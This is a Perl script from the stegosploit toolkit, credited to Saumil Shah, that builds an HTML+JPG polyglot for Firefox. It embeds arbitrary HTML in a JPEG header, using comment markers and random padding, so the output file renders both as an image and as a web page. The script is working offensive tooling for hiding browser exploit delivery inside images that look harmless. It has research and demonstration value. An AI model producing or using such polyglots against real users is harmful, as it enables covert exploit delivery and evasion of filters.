#!/usr/bin/perl
#
#                                  .       .
#                                 / `.   .' \
#                         .---.  <    > <    >  .---.
#                         |    \  \ - ~ ~ - /  /    |
#                          ~-..-~             ~-..-~
#                      \~~~\.'   stegosploit      `./~~~/
#                       \__/                        \__/
#                         /  .    -.                  \
#                  \~~~\/   {       \       .-~ ~-.    -._ _._
#                   \__/    :        }     {       \     ~{  p'-._
#    .     .   |~~. .'       \       }      \       )      \  ~--'}
#    \\   //   `-..'       _ -\      |      _\      )__.-~~'='''''
# `-._\\_//__..-'      .-~    |\.    }~~--~~  \=   / \
#  ``~---.._ _ _ . - ~        ) /=  /         /+  /   }
#                            /_/   /         {   } |  |
#                              `~---o.       `~___o.---'
#
#
# by Saumil Shah @therealsaumil
#
# This script creates an HTML+JPG polyglot
#
# for Firefox browsers (lines changed - 81, 88)

$| = 1;

$htmlfile = $ARGV[0];
$jpgfile = $ARGV[1];
$outfile = $ARGV[2];

$RANDOM_DATA_SIZE = 1900;

print <<"EOT";

                                  .       .
                                 / `.   .' \\
                         .---.  <    > <    >  .---.
                         |    \\  \\ - ~ ~ - /  /    |
                          ~-..-~             ~-..-~
                      \\~~~\\.'   stegosploit      `./~~~/
                       \\__/                imajs   \\__/
                         /  .    -.                 \\
                  \\~~~\\/   {       \       .-~ ~-.    -._ _._
                   \\__/    :        }     {       \\     ~{  p'-._
    .     .   |~~. .'       \\       }      \\       )      \\  ~--'}
    \\\\   //   `-..'       _ -\\      |      _\\      )__.-~~'='''''
 `-._\\\\_//__..-'      .-~    |\\.    }~~--~~  \\=   / \\
  ``~---.._ _ _ . - ~        ) /=  /         /+  /   }
                            /_/   /         {   } |  |
                              `~---o.       `~___o.---'

EOT

if($#ARGV < 2) {
   print "Usage: $0 <html source> <jpg source> <output>\n";
   exit;
}

local $/;

$htmldata = "";

if($htmlfile ne '-') {
   open(HTMLFILE, $htmlfile) || die("Cannot open $htmlfile\n");
   $htmldata = <HTMLFILE>;
   close(HTMLFILE);
}

$htmldata =~ s/[\r\n]+$//;    # remove trailing newline characters

open(JPGFILE, $jpgfile) || die("Cannot open $jpgfile\n");
$jpgdata = <JPGFILE>;
close(JPGFILE);

$jpgstart = substr($jpgdata, 0, 4);     # first 4 bytes FF D8 FF E0
$jfifapp0 = substr($jpgdata, 6, 14);    # from JFIF to offset 0x13
$restofjpg = substr($jpgdata, 0x14);    # the rest of the file

$html = "<!-- ";

$content = " -->";

# remove <html>, <head> and <meta http-equiv ...> tags
# from the source HTML file

#$htmldata =~ s/<html>//i;
#$htmldata =~ s/<head>//i;
#$htmldata =~ s/<meta http-equiv=[^>]*>//i;

$content .= $htmldata . "<!--";

$padding_length = 0x2f2a - length($content) - length($html);  # 0x2f2a = /*
$random_length = int(rand($RANDOM_DATA_SIZE));

$padding = "";
for($i = 0; $i < $padding_length; $i++) {
   while(1) {
      $x = int(rand(255));
      if($x != 0 && $x != ord('<') && $x != ord('>') && $x != ord('/')) {
         last;
      }
   }
   $padding .= chr($x);
}

$pre_padding = substr($padding, 0, $random_length);
$post_padding = substr($padding, $random_length);

$final_content = $html . $pre_padding . $content . $post_padding;
print "HTML header length = " . length($html) . "\n";
print "Pre Padding length = " . length($pre_padding) . "\n";
print "Post Padding length = " . length($post_padding) . "\n";
print "HTML data length = " . length($htmldata) . "\n";
print "Content length = " . length($content) . "\n";
print "Final content length = " . length($final_content) . "\n";
$newjpg = $jpgstart . "/*" . $jfifapp0 . $final_content . $restofjpg . "*/ -->";

open(OUTPUT, ">$outfile") || die("Cannot write to $outfile\n");
print OUTPUT $newjpg;
close(OUTPUT);

print "Written $outfile\n";
